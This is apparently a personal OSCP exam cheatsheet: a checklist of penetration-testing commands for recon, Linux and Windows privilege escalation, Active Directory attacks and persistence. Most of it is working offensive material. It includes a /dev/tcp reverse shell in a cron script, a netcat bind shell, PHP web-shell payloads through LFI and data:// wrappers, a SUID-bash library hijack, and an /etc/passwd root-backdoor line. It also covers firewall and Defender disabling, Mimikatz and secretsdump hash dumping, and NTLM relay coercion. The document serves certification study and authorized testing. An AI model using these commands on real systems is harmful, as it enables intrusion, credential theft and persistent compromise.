---
title: "OSCP Cheatsheet"
description: "Master methodology checklist for exam and lab workflows"
showDate: false
showAuthor: false
showReadingTime: false
showWordCount: false
showTableOfContents: true
---

> [!tip] ALWAYS ASK YOURSELF WHY IT EXISTS

# Recon

- [ ] **Run Autorecon**
	- `autorecon 192.168.133.12 --nmap-append="--min-rate=20000" --exclude-tags dirbuster`
	- `sudo nmap -Pn -n 192.168.200.65 -sC -sV -p- --open`
- [ ] **Zone Transfer**
	- `dig axfr @10.10.10.83 ctfolympus.htb`
	- `knock -v 10.10.10.83 3456 8234 62431`
- [ ] **Nmap Full TCP Scan**
	- `nmap -p- -sCV -A -Pn <ip addr> --min-rate=20000`
	- SCAN ALL PORTS. Try fingerprint `-nvv` or connect to the port with `nc` and see what it returns
- [ ] **Nmap UDP Scan**
	- Run against discovered subdomains as well
	- Ref: Tools -> Nmap
- [ ] **Directory Brute Force**
	- Ask why a 302 directory was found. Scan for default directories related to the service manually
	- Ref: Tools -> Feroxbuster
- [ ] **Gobuster Directory Scan**
	- Sometimes a different buster exposes more endpoints
	- Ref: Tools -> Gobuster
- [ ] **Run Nikto on HTTP**
	- `nikto -h <IP>`
- [ ] **Check Page Source and Response Header**
	- Ctrl+U, check JS files
	- Ref: Ports -> Port 80
- [ ] **Subdomain Enumeration**
	- `wfuzz -u http://<IP> -H "Host: FUZZ.domain.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
	- Ref: Tools -> Wfuzz
- [ ] **Check robots.txt**
	- `/robots.txt` — Ref: Ports -> Port 80
- [ ] **Check README**
	- `/README.txt` — Ref: Ports -> Port 80
- [ ] **Analyze every request with Burp**
	- Test every function of the site for LFI, SQLi, IDOR, Mass Assignment, Business Logic
- [ ] **If LFI, File Read or Path Traversal**
	- Look for a user and grab `.ssh` in `/home/remi/.ssh`
	- https://pwnbase.org/helpers/file-read — fuzz params with wfuzz `file.php?FUZZ=../../../../etc/passwd`, check RFI and ssh, then `/etc/shadow` `/proc/self/environ` `/var/log/apache2/access.log` `/var/log/auth.log` -> ssh poison & `cmd=id`
	- `nc -nv $IP 22` then `omgthisiss/<?php passthru($_GET['cmd']); ?>`
- [ ] **TLS/SSL Certificates**
	- `openssl s_client -connect <IP>:<PORT>` — good for grabbing usernames
- [ ] **DNS Enumeration**
	- `nslookup` ; `dig`
- [ ] **CVE Enum**
	- 1) searchsploit (keep updated) + double-check Rapid7  2) Sploitus  3) GitHub search (sign in, search the CVE name or part of the POC from searchsploit, don't google-dork it)  4) CVEdetails
	- https://www.cvedetails.com/ , offsec discord
- [ ] **Check for version number leaks**
	- Check error pages for the framework's service version. Also google the error
- [ ] **Check for vulnerabilities on certain components**
	- Google the kit/package the website uses and look for a vuln
- [ ] **If you get stuck**
	- Map out how the website works
- [ ] **Map out how the website works**
	- Figure out what the website is doing, AND PLUGINS (when stuck)
- [ ] **Fuzz Parameters**
	- Fuzz parameters and check for LFI
- [ ] **Custom Wordlist**
	- `cewl http://192.168.213.180:80/ | grep -v CeWL > wordlist.txt`
- [ ] **Use php wrapper**
	- `php://filter` to include contents, and `data://` for code exec (needs `allow_url_include`)
	- `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php echo system('ls');?>"`
	- `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
	- `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
	- Use if part of the page is missing when curling

# Enumeration

- [ ] **Check Virtual Hosts**
	- `ls /etc/nginx/sites-enabled` ; `ls /etc/apache2/sites-enabled` — may reveal another subdomain
- [ ] **Enumerate Listening Ports**
	- `netstat -tulnp` — Ref: PrivEsc -> Network & Pivoting
- [ ] **Check Running Processes**
	- `ps -ef --forest` — Ref: PrivEsc -> Network & Pivoting
- [ ] **Check Active Services**
	- `ss -lntp`, `ps aux | grep -i root | grep 8080`, `netstat -ano`, `curl -I http://127.0.0.1:7999`, `nc -nv 127.0.0.1 3306`, `nmap -sV -sC 127.0.0.1 -p 1935,7999,3306,8888,8765,9081,33060,8554`
	- `grep -R "7999\|8888\|8765\|9081\|8554\|1935" /etc 2>/dev/null` ; `grep -R "3306\|mysql" /etc 2>/dev/null`
- [ ] **Check Installed Packages and Software**
	- `pip3 list`, check ProgramData or `/etc` or Recyclebin (sometimes in quotes) — Ref: PrivEsc -> Writeable Locations
- [ ] **Examine Binary content & check metadata**
	- A weird binary may have a hardcoded password. Check metadata of any file
- [ ] **Reuse the passwords and usernames**
	- Reuse pass and user everywhere
- [ ] **Check if python is running**
	- `python -V 2>&1` ; `python3 -V 2>&1`
- [ ] **Process Enumeration**
	- `/proc/self/environ` to see what's running (useful if LFI)
- [ ] **Identify Framework**
	- Check for more endpoints or a debugging endpoint related to the framework
- [ ] **Check Root Directories**
	- Manual check `/var/www` `/home` `/root`
- [ ] **Check Absolute vs Relative Paths**
	- Look for quotes (manual review) — Ref: PrivEsc+ Unquoted Service Paths
- [ ] **SMB Enumeration**
	- `smbclient -L //<IP> -N` — check null auth with netexec `-u any -p`
- [ ] **LDAP Enumeration**
	- `ldapsearch -x -h <IP>`
- [ ] **Check Config files & ENV**
	- `grep -R "pass" /usr/share/zoneminder 2>/dev/null`, `env` — check env vars within the config too
- [ ] **Check Program Files**
	- Look for 3rd party apps and `.ini` files
- [ ] **Check for Database config**
	- `htdocs/conf/conf.php`, salts `C:\xampp\htdocs\blog\boot\defines.php`, hashing algo `C:\xampp\htdocs\blog\engine\Security.php`
	- Figure out where the app stores db creds / any config file
- [ ] **Check who can ssh**
	- `/etc/ssh/sshd_config`
- [ ] **Check if you are using a blocked port**
	- Firewalls may block ports; bypass using a different/standard service port, or look into bind shells: `busybox nc -l -p 8080 -e /bin/sh`

# PrivEsc

- [ ] **Check for vuln library**
	- If a cron-targeted script imports a vulnerable/writable library, modify it:
	- ```python
	  import os
	  os.system("cp /bin/bash /tmp/bash; chmod u+s /tmp/bash;")
	  ```
	- then `./bash -p` ; find it with `find / -name libraryname.py 2>/dev/null`
- [ ] **Easy Quick Grab**
	- `sudo -l` and check `env`
- [ ] **Check for Listening Ports**
	- `netstat -ano`
- [ ] **Check For Writeable Files**
	- Check LinPEAS output for writeable files
- [ ] **Check for alias**
	- `alias`, `/proc/self/cmdline`, enumerate by user
	- https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
- [ ] **Check .bash_history**
	- Check `.bash_history` in users' directories
- [ ] **Look for root ssh key**
	- If root key present: `ssh -i root root@127.0.0.1`
- [ ] **Analyze Root Processes**
	- `ps aux | grep root`
- [ ] **Check network traffic**
	- `tcpdump -i lo -A`, `sudo tcpdump -i tun0`, `sudo tcpdump -i lo -A | grep "pass"` — check for leaked creds
- [ ] **Check Suid**
	- `find / -perm -4000 2>/dev/null`
- [ ] **Check capabilities**
	- `/usr/sbin/getcap -r / 2>/dev/null`
- [ ] **Check Writable Files**
	- `find / -type f -writable -user www-data 2>/dev/null`
	- `find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|run)'`
- [ ] **PATH Hijacking Check**
	- `strings <binary>` ; `ltrace <binary>` — analyze any binary you come across
- [ ] **Analyze Binary Execution**
	- `ltrace <binary>` — check if you can escape with `&&` or `;`, or if input is sanitized (`bash -i`)
- [ ] **Run Linpeas**
	- Go slow: crons, suids, users, site config, processes, unusual files, ports, system timers, each cron's contents
- [ ] **Run LSE.sh**
	- with level 1
- [ ] **CronJob**
	- `ls -lah /etc/cron*`, `crontab -l`. If you see a cronjob run pspy and check each dir
	- ```bash
	  #!/bin/bash
	  bash -p -c "bash -i >& /dev/tcp/192.168.45.152/81 0>&1"
	  ```
- [ ] **Check For password**
	- `grep -r password /var/lib/openfire`
- [ ] **Finding a file**
	- `sudo find / -name "local.txt"`
	- `sudo find / -name "local.txt" -exec cat {} \; 2>/dev/null`
- [ ] **Check firewall port rules**
	- `cat /etc/iptables/rules.v4`
- [ ] **Check for other drives**
	- https://linux.die.net/man/8/lsblk
- [ ] **Run Kernel Exploit**
	- Last resort when no other vectors: Pwnkit, DirtyPipe

# Exploitation

- [ ] **SQLi enumeration**
	- pwnbase — https://pwnbase.org/tools

# Persistence

- [ ] **Add SSH Persistence**
	- `mkdir ~/.ssh`, `ssh-keygen`, rename `key.pub` to `authorized_keys`, upload into `/home/user/.ssh/`, then `ssh user@<ip> -i id_rsa`
- [ ] **/etc/passwd Persistence**
	- `openssl passwd w00t` then `echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd` then `su root2`

# AD-Enumeration

- [ ] **Find usernames**
	- rid-brute if users don't work, `net user /domain`
	- netexec `--rid-brute`, `--users`, kerbrute
- [ ] **Check your environment w PowerView**
	- List out your environment with PowerView (see Tools page)
- [ ] **Check RDP Access (3389)**
	- `nmap -p 3389 <IP>`
- [ ] **BloodHound**
	- Check SPN of users. If it fails: `bloodyAD -d pirate.htb -u pentest -p 'p3nt3st2025!' --host dc01.pirate.htb get writable`
	- `bloodhound-python -u <user> -p <pass> -dc <IP> -d <domain> -c all`
	- Cyphers: `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p` ; `MATCH (m:Computer) RETURN m`
	- Check for outbound object control for each owner you own
- [ ] **LAPS Check**
	- Check for LAPS passwords — `C:\ProgramFiles\LAPS`
- [ ] **Check Privileges**
	- `whoami /groups` ; `whoami /priv`
- [ ] **Check if Defender Active**
	- `reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"` ; `sc query WinDefend` ; `Get-MpComputerStatus`
- [ ] **Check AppLocker Policies**
	- `Get-AppLockerPolicy -Effective`
- [ ] **Check Certify & Vuln**
	- `Invoke-WebRequest http://<IP>:8081/Invoke-Certify.ps1 -OutFile Certify.ps1` then `powershell -ep bypass -c ".\Certify.ps1; Invoke-Certify find /vulnerable"`
	- `certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout` — also check `nxc -M adcs`
- [ ] **Check for NTLMv2**
	- Use responder to catch. Check if you can connect back through SMB. If you can't crack it, relay it
- [ ] **NTLMrelay (check if local admin has a session)**
	- `python3 PetitPotam.py 10.10.14.5 10.129.231.186`, `nxc -M ldap-checker`, `nxc smb <TargetIP> -u 'username' -p 'password' -M coerce_plus`
	- Works if SMB or LDAP signing is disabled
- [ ] **Run enum4linux**
	- `enum4linux $target | tee enum4linuxng.log`
- [ ] **Check for possible subdomains**
	- `dnsrecon -d 'EGOTISTICAL-BANK.LOCAL' -n $target`
- [ ] **Authenticate with every possible protocol**
	- Try `-k` or `--local-auth` if treated as domain user. `--generate-krb5-file krb5.conf`, `sudo cp krb5.conf /etc/krb5.conf`, `kinit f.frizzle`, `ssh -k f.frizzle@frizzdc.frizz.htb`
	- LOCAL AUTH LOCAL AUTH
- [ ] **Test for kerberoasting**
	- Check Administrator group, and from each machine. Add hosts e.g. `10.10.166.140 DC01.oscp.exam`. Needs username + password
- [ ] **Test for ASEP roasting**
	- `kerbrute userenum usernames --dc $target -d fusion.corp` (with username list after kerbrute)
- [ ] **Check LDAP, RPC, SMB with anon access and check for public shares**
	- Recheck shares for every new user — `netexec smb $target -u -p ''`
- [ ] **Scan All TCP Ports & UDP**
- [ ] **LDAPSEARCH check info field for exposed creds**
	- `nmap -n -sV --script "ldap* and not brute" -p 389 $target` — Apache Directory
- [ ] **Check SYSVOL**
	- SMB — maybe something useful in the scripts
- [ ] **RID brute after SMB**
	- username enum helps — `crackmapexec smb $target -u enterprise-core-vn -p 'lalala' --rid-brute`
- [ ] **Check if you can put stuff**
	- Upload to SMB / put to FTP webroot / grab hash with ntlmrelay — https://github.com/Greenwolf/ntlm_theft
- [ ] **Bruteforce different protocols**
	- Also check if username == password (lower and upper)
- [ ] **Every time you get a new cred don't forget**
	- (re-run enumeration with the new cred)

# AD-PrivEsc

- [ ] **Check Powershell history**
	- `(Get-PSReadlineOption).HistorySavePath` then cd there and `type *` — check for all users
- [ ] **Check All installed Applications**
	- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- Check 32 & 64-bit Program Files and Downloads
- [ ] **Check running Processes and Services**
	- `Get-Process`; `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}` then icacls to check perms
	- Check start mode: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}` or `sc qc servicename`
	- `sc.exe config wuauserv binpath="C:\Windows\System32\cmd.exe /c C:\ProgramData\shell.exe"`
- [ ] **Check for Quoted and Unquoted**
	- `wmic service get name,pathname | findstr /i /v "C:\Windows\\"` ; `sc qc "Development Service" state=all` then `Start-Service GammaService` and stop
- [ ] **Check for Scheduled tasks**
	- `schtasks /query /fo LIST /v` ; `Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`
- [ ] **Check for strange exe and if bound to a service**
	- `Get-Service | findstr /i audit` ; `sc query | findstr /i "audit"` ; `sc qc admintool.exe` ; `schtasks /query /fo LIST /v | findstr /i admintool`
	- Is it a service, scheduled task, or startup program? Use strings to examine it
- [ ] **Check for config files**
	- `Get-ChildItem -Path C:\users\ -include *.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.rar,*.zip,*.7z -File -Recurse -ErrorAction SilentlyContinue`
	- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
	- `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- [ ] **Bloodhound**
	- `-just-dc-ntlm`
- [ ] **Winpeas**
	- Check hostname, run as admin again. Check permissions, then powerup.ps1, then winpeas
- [ ] **Windows exploit suggester**
	- run local exploit suggester
- [ ] **Dump hashes Remotely**
	- `netexec smb $target -u Admin -H <nt hash> --ntds` or `--lsa` — add user to admin group then dump. CAN ONLY DUMP NTDS ON DC
- [ ] **Run secretsdump**
	- when you have domain admin — `impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/whitehat:akdfjakfaklf@$target`
- [ ] **Check for Administrator user**
	- `net user /domain`
- [ ] **Check Listening ports**
- [ ] **Run PowerUp.ps1, PrivescCheck.ps1 and then WinPEAS**
	- `. .\PrivescCheck.ps1; Invoke-PrivescCheck`
- [ ] **Run whoami /all**
	- easy wins
- [ ] **Pivot Check**
	- Relay all tools to the jumpbox. Check for additional network adapters:
	- `for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done`
	- `nslookup WEB01.pirate.htb 10.129.3.153`
- [ ] **Responder**
	- Check if a writeable share is a path to steal hashes with responder
- [ ] **Check task**
	- `tasklist /v`
- [ ] **Check interesting files**
	- `C:\>findstr /SIM /c:"pass" *.ini *.cfg *.xml`
- [ ] **Check Xampp dir and version**
	- Could be old xampp. Check `C:\xampp\properties.ini` and `/`
- [ ] **Extra**
	- Try a staged payload with msfvenom, and `powershell -ep bypass C:/lalal`
- [ ] **Check for certificate based attacks**
	- Certipy
- [ ] **Shell as new user**
	- Dump all hashes and collect them in a file
- [ ] **GPP ABUSE**
	- `dir \\<domain>\SYSVOL\<domain>\Policies\ /s /b | findstr cpassword` — check for cpassword in SYSVOL
- [ ] **If all else fails then Kernel**
	- `systeminfo` then check for exploits: `Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`
- [ ] **Check for unusual exe in logs**
- [ ] **Check installed patches**
	- `wmic qfe list`

# AD-Persistence

- [ ] **Disable Defender (Admin)**
- [ ] **Disable AMSI (Admin)**
- [ ] **Disable firewall**
	- `netsh advfirewall set allprofiles state off`
	- `Set-NetFirewallProfile -profile domain,public,private -enabled false`
- [ ] **Enabling RDP**
	- `netexec smb $IP -u administrator -p pass123 -M rdp -o ACTION=enable`

# Credential Access

- [ ] **Check Stored Credentials (Windows)**
	- `cmdkey /list` — Ref: PrivEsc -> Windows
- [ ] **Dump Hashes (SMB)**
	- `nxc smb <IP> -u <user> -p <pass> --sam` — only works if user is pwned
- [ ] **Run Mimikatz**
	- `sekurlsa::logonpasswords`
- [ ] **Grab Hashes**
	- `cat /etc/passwd`

# Resources & Reminders

- WIndows Privesc — oscp | Linux Privesc — oscp | AD — oscp
- run winpeas as admin
- include root/admin, password, and lowercase usernames in the passwords file
- Do a fresh enumeration from an internal machine — more ports may be reachable internally
- if stuck, nmap twice
- always check OS command injection as well
- using a kcache ticket ; wp means enumerate users & plugins
- `grep -r -i 'gilbert' 2>/dev/null`
- SPRAY THE HASHES — two local admins may share one
- maybe you have to relay the auth

### Reference Links
- https://www.emmanuelsolis.com/oscp.html
- https://notes.l1nuxkid.dev/oyecp-active-directory-checklist
- https://michalszalkowski.com/
- https://nored0x.github.io/red-teaming/windows-enumeration/#find-all-passwords-in-all-files
- https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2025/anomaly
- https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b

### AD quick commands
```bat
sc query | findstr /i wise
sc qc wisebootass
tree /f /a
dir /s /b *.log
dir /s /b *.txt
schtasks /query /fo LIST /v /TN "name"
dir /A
```
